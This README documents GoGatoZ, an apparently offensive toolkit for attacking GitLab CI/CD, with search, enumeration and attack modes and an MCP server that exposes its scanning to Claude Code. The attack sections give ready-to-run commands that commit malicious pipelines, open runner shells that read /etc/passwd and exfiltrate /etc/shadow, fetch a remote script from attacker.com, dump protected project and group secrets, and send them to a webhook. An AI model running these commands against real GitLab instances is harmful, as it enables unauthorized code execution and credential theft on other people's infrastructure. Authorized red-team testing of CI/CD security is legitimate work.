# GoGatoZ (GitLab Attack Toolkitz)

GoGatoZ is the Golang port of Gato‑X, adapted for GitLab CI/CD instead of GitHub Actions.
It provides three modes: search, enumerate, and attack.

GoGatoZ is hosted on GitHub at [mr-pmillz/gogatoz](https://github.com/mr-pmillz/gogatoz), with CI/CD on GitHub Actions and documentation published via GitHub Pages. The tool itself targets GitLab CI/CD as its scanning and attack surface.

## Installation

Install the latest release with `go install`:

```bash
go install github.com/mr-pmillz/gogatoz@latest
```

Pull and run the container image from GitHub Container Registry (GHCR):

```bash
docker pull ghcr.io/mr-pmillz/gogatoz:latest
docker run --rm ghcr.io/mr-pmillz/gogatoz:latest --help
```

Prebuilt binaries for each platform are attached to the [GitHub Releases page](https://github.com/mr-pmillz/gogatoz/releases).

## Quick Start (GitLab)

1. Create a GitLab Personal Access Token (PAT) with scopes: `api`, `read_repository` (and `write_repository` for attack modules).
2. Export the token and optionally the GitLab URL (for self‑hosted instances). For internal GitLab with custom CAs or self-signed certs, see TLS flags below:

```bash
export GITLAB_TOKEN=glpat_xxx
export GITLAB_URL=https://gitlab.com
```

3. Build and run the CLI:

```bash
go build -o gogatoz .
./gogatoz version
./gogatoz search --query "runner" --per-page 20 --max-pages 1
```

- Use --json for machine‑readable output.

Code content filter example (filters projects to those whose repository contains CI keywords):

```bash
./gogatoz search -q "runner" --code-content "tags: self-hosted" --code-per-page 10 --code-max-pages 1 --json
```

Path pattern filter examples (filter projects to those whose repo paths match a glob):

```bash
# Projects containing a .gitlab-ci.yml anywhere in the repo
./gogatoz search -q "runner" --path-pattern ".gitlab-ci.yml" --json

# Projects with any deploy YAML under a ci/ subtree (supports ** and ?)
./gogatoz search -q "deploy" --path-pattern "ci/**/deploy?.yml" --path-ref main --path-per-page 100 --path-max-pages 10 --json
```

Language/topic filter examples and JSONL export:

```bash
# Filter to projects that contain Go or Python code (any-of via /languages)
./gogatoz search -q "runner" --language go,python --format jsonl --output results.jsonl

# Filter to projects that have topic/tag "security" or "devops"
./gogatoz search -q "ci" --topic security,devops --per-page 100 --max-pages 0
```

Note: --max-pages=0 fetches all pages until there are no more.

Self-hosted/internal instance example for search:

```bash
# Prefer the global --gitlab-url flag (per-command --instance is deprecated)
./gogatoz search --gitlab-url https://gitlab.internal.local -q "ci" \
  --path-pattern ".gitlab-ci.yml" --insecure-skip-tls-verify
```

Enumerate example:

```bash
./gogatoz enumerate --input targets.txt --concurrency 16 --timeout 20s --json
```

Pipe search results (JSONL) into enumerate (auto-detected input format):

```bash
./gogatoz search -q "runner" --format jsonl \
  | ./gogatoz enumerate --input - --concurrency 32 --format jsonl --output results.jsonl
```

Attack examples:
- Commit a custom CI pipeline to a new branch (implemented):
```bash
# Inline YAML
./gogatoz attack -t group/project --commit-ci --ci-yaml 'stages: [test]\njob: { script: ["echo pwn"] }'

# From file
./gogatoz attack -t group/project --commit-ci --ci-file ./pipeline.yml --branch exfil-branch

# From stdin
cat pipeline.yml | ./gogatoz attack -t group/project --commit-ci --ci-stdin --branch test-attack
```
- Render payload YAML locally (--payload-only):
```bash
# Render a webshell payload (runner-on-runner shell) that runs a command on tagged runners
./gogatoz attack --payload-only \
  --payload ror-shell \
  --job-name shell \
  --tags self-hosted,linux \
  --cmd 'id; uname -a'

# Render a Pwn Request (MR-based) payload that executes the MR description when targeting main|prod
./gogatoz attack --payload-only \
  --payload pwn-request \
  --job-name pwn \
  --target-branch-regex 'main|prod'
```
- Secrets exfiltration:
```bash
./gogatoz attack -t group/project --secrets --branch exfil-branch --tags self-hosted --pubkey-file ./pubkey.pem
```
- Secrets API dump (project and group variables):
```bash
# Dump project variables to JSON
./gogatoz attack -t group/project --secrets --project-vars --json

# Dump group variables (requires group ID or full path)
./gogatoz attack -t group/project --secrets --group-vars --group-id mygroup/subgroup --json

# Include protected variables
./gogatoz attack -t group/project --secrets --project-vars --group-vars --group-id 123 --include-protected --json
```
- Runner discovery and targeting:
```bash
# Discover available runner tags for a project
./gogatoz attack -t group/project --discover-tags

# Filter by executor type
./gogatoz attack -t group/project --discover-tags --executor docker --json

# Discover tags and filter by shell executor
./gogatoz attack -t group/project --discover-tags --executor shell
```
- Runner-on-Runner (RoR) attacks:
```bash
# Basic RoR shell payload with command execution
./gogatoz attack -t group/project --commit-ci --payload ror-shell \
  --tags self-hosted,linux --cmd 'whoami; cat /etc/passwd'

# RoR with file download/exfiltration
./gogatoz attack -t group/project --commit-ci --payload ror-shell \
  --tags self-hosted --download /etc/shadow

# Advanced RoR with remote script and keep-alive (heartbeat every 30s)
./gogatoz attack -t group/project --commit-ci --payload runner-on-runner \
  --tags self-hosted,windows --script-url https://attacker.com/payload.ps1 \
  --os windows --keepalive 30

# Auto-discover tags and commit RoR payload
./gogatoz attack -t group/project --commit-ci --payload ror \
  --executor docker --cmd 'id; uname -a'
```
- Branch deconflict strategies:
```bash
# Fail if branch exists (default behavior)
./gogatoz attack -t group/project --commit-ci --ci-file payload.yml --deconflict fail

# Append suffix if branch exists (gogatoz-attack-1, gogatoz-attack-2, etc.)
./gogatoz attack -t group/project --commit-ci --ci-file payload.yml --deconflict suffix

# Force overwrite existing branch
./gogatoz attack -t group/project --commit-ci --ci-file payload.yml --deconflict force
```
- Cleanup mode (remove attack artifacts):
```bash
# Remove a specific branch
./gogatoz attack -t group/project --cleanup --cleanup-branch gogatoz-attack

# Remove .gitlab-ci.yml from a branch
./gogatoz attack -t group/project --cleanup --cleanup-ci --branch exfil-branch

# Revoke a deploy key by ID
./gogatoz attack -t group/project --cleanup --revoke-deploy-key 12345

# Remove a member by user ID
./gogatoz attack -t group/project --cleanup --remove-member-id 67890

# Comprehensive cleanup (remove branch, CI file, deploy key, and member)
./gogatoz attack -t group/project --cleanup \
  --cleanup-branch gogatoz-attack \
  --cleanup-ci \
  --revoke-deploy-key 12345 \
  --remove-member-id 67890 --json
```

## Configuration file (Viper)

You can provide defaults in a config file and override them with environment variables and flags.

- Location: pass --config or set GOGATOZ_CONFIG. If not set, ./.gogatoz.yaml is used if present.
- Precedence: flags > environment variables > config file > built‑in defaults.
- Environment variables follow the flag names uppercased with dashes replaced by underscores, e.g. FOLLOW_INCLUDES, INCLUDE_DEPTH, GITLAB_URL, TOKEN.

Example .gogatoz.yaml:

```yaml
# Global defaults
gitlab-url: https://gitlab.com
# You can omit token here and use env GITLAB_TOKEN instead
json: true
verbose: false
# Reliability knobs (optional)
rate-rps: 8        # requests per second
rate-burst: 16     # burst size
retry-max: 3       # retries on 429/5xx
user-agent: GoGatoZ/0.1 (+docs)

# Enumerate defaults
input: ./targets.txt
concurrency: 16
timeout: 20s
follow-includes: true
include-depth: 3
only-findings: false
```

Run with:

```bash
./gogatoz enumerate --config .gogatoz.yaml
```

## Reliability and rate limits

### Self-hosted/internal GitLab support

- Use --gitlab-url to point at your internal instance (e.g., https://gitlab.internal.local). You can also override per-command via --instance on search.
- If your instance uses a self-signed or private CA certificate, either provide --ca-cert /path/to/ca.pem or use --insecure-skip-tls-verify for testing only.
- If your instance uses a self-signed certificate or a private CA, you can:
  - Provide additional CA certificates with --ca-cert / path and/or GOGATOZ_CA_CERT.
  - As a last resort for testing, skip verification with --insecure-skip-tls-verify or GOGATOZ_INSECURE (not recommended in production).
- These TLS options apply to all API calls and to remote include fetching in enumerate when enabled.

GitLab may throttle API requests. GoGatoZ uses a token bucket rate limiter and adaptive retries with jittered exponential backoff for 429/5xx responses.

Global flags to tune behavior:
- --rate-rps float (default 8): Max requests per second.
- --rate-burst int (default 16): Token bucket burst size.
- --retry-max int (default 3): Max retries on 429/502/503/504; set to 1 to disable retries.
- --user-agent string: Custom User-Agent header.
- --http-max-idle int: HTTP transport MaxIdleConns (default internal; set to tune pooling size).
- --http-max-idle-per-host int: HTTP transport MaxIdleConnsPerHost.
- --http-idle-timeout duration: HTTP transport IdleConnTimeout (e.g., 90s).
- --http-tls-timeout duration: HTTP transport TLSHandshakeTimeout (e.g., 10s).
- --http-expect-timeout duration: HTTP transport ExpectContinueTimeout (e.g., 1s).
- --http-req-timeout duration: HTTP client overall request timeout (e.g., 30s).

These can also be set via config keys or environment variables (GOGATOZ_RATE_RPS, GOGATOZ_RATE_BURST, GOGATOZ_RETRY_MAX, GOGATOZ_USER_AGENT, GOGATOZ_HTTP_MAX_IDLE, GOGATOZ_HTTP_MAX_IDLE_PER_HOST, GOGATOZ_HTTP_IDLE_TIMEOUT, GOGATOZ_HTTP_TLS_TIMEOUT, GOGATOZ_HTTP_EXPECT_TIMEOUT, GOGATOZ_HTTP_REQ_TIMEOUT).

## Docker image

You can use the prebuilt container image from GitHub Container Registry (GHCR), published by the release workflow.

Examples:

- Run the binary to show help:

```bash
docker run --rm -it \
  -e GITLAB_TOKEN=glpat_xxx \
  -e GITLAB_URL=https://gitlab.com \
  ghcr.io/mr-pmillz/gogatoz:latest --help
```

- Enumerate projects from a local file:

```bash
# Assuming projects.txt is in the current directory
docker run --rm -it \
  -e GITLAB_TOKEN=glpat_xxx \
  -v "$PWD/projects.txt":/work/projects.txt \
  ghcr.io/mr-pmillz/gogatoz:latest enumerate -i /work/projects.txt --json
```

Released images are tagged with the version (e.g. `ghcr.io/mr-pmillz/gogatoz:v1.2.3`) and `latest`.

## MCP Server (Claude Code Integration)

GoGatoZ includes an MCP (Model Context Protocol) server for direct integration with Claude Code and other MCP-compatible clients.

### Setup

1. Copy `.mcp.json.example` to `.mcp.json` and update paths/tokens for your environment
2. Restart Claude Code to pick up the MCP server

### Tools

The MCP server exposes two tools over stdio:

- **search_projects** -- search GitLab for projects with filters (query, visibility, topic, language, path-exists)
- **enumerate_projects** -- scan projects for CI/CD security vulnerabilities (includes, runners, secrets, injection)

### Result Storage

Pass `--db <path>` to persist all search and enumerate results in a local SQLite database:

```bash
# Via CLI
GITLAB_TOKEN=glpat-xxx ./gogatoz mcp --db results.sqlite3

# Via .mcp.json (Claude Code auto-starts the server)
{
  "mcpServers": {
    "gogatoz": {
      "command": "go",
      "args": ["run", ".", "mcp", "--db", "gogatoz-results.sqlite3"],
      "cwd": "/path/to/gogatoz",
      "env": {
        "GITLAB_TOKEN": "${YOUR_TOKEN_ENV_VAR}",
        "GITLAB_URL": "https://gitlab.com"
      }
    }
  }
}
```

Results are auto-stored when the database is configured. Each search or enumerate call creates a session with full results and nested findings.

## HTML Reports

Generate self-contained HTML reports with interactive charts (Chart.js), summary cards, and searchable/sortable DataTables:

```bash
# From enumerate JSONL results
./gogatoz report --input results.jsonl --output report.html

# Directly from enumerate
./gogatoz enumerate --input targets.txt --format html --output report.html

# From SQLite database
./gogatoz report --db results.sqlite3 --session 1 --output report.html

# Only projects with findings
./gogatoz report --input results.jsonl --only-findings --output report.html
```

The report includes severity distribution charts, finding type breakdowns, infrastructure risk summaries, and CSV-exportable tables.

## Roadmap Highlights

- GitLab API v4 and GraphQL integration using official client.
- Parser for `.gitlab-ci.yml` with vulnerability checks (rules/only/includes/variables, workflow rules), and modeling of default/before_script/after_script plus job image/services/artifacts/cache. Include resolution supports local, project, remote (guarded), template, and component (GraphQL-backed with inputs substitution).
- Fast concurrent scanning engine for enumerate mode.
- Attack modules for Runner‑on‑Runner and secrets dumping.

## License

GoGatoZ is licensed under the Apache License, Version 2.0 (LICENSE). The original Gato‑X project is © 2024 Adnan Khan.


## Enumerate include resolution

- By default, enumerate resolves transitive includes in .gitlab-ci.yml up to depth 2.
- Flags:
  - --follow-includes: enable/disable include resolution (default: true)
  - --include-depth: maximum depth to resolve includes (default: 2)
  - --deep: shorthand to enable deep include resolution (sets --follow-includes and bumps --include-depth to >=3)

Example with include resolution disabled:

```bash
./gogatoz enumerate --input targets.txt --concurrency 16 --timeout 20s --follow-includes=false
```

Example using deep mode:

```bash
./gogatoz enumerate --input targets.txt --deep --json
```



## New: Using --payload with --commit-ci (2025-11-01)

You can now use --payload as a CI content source when committing to a target repository. This makes it easy to select a known-good payload template without maintaining local files.

Examples:

- Commit a Pwn Request payload to a branch (MR-triggered job):

```bash
./gogatoz attack -t group/project --commit-ci \
  --payload pwn-request \
  --target-branch-regex 'main|prod' \
  --branch pr-pwn
```

- Commit a Runner-on-Runner remote script payload (Linux):

```bash
./gogatoz attack -t group/project --commit-ci \
  --payload ror \
  --tags self-hosted,linux \
  --script-url https://example.org/payload.sh \
  --os linux
```

- Commit a Secrets Exfiltration payload with a webhook and artifact dump:

```bash
./gogatoz attack -t group/project --commit-ci \
  --payload secrets \
  --webhook https://webhook.internal/ingest \
  --artifacts-path env.txt
```

Note: You can still render locally with --payload-only to inspect YAML before committing.
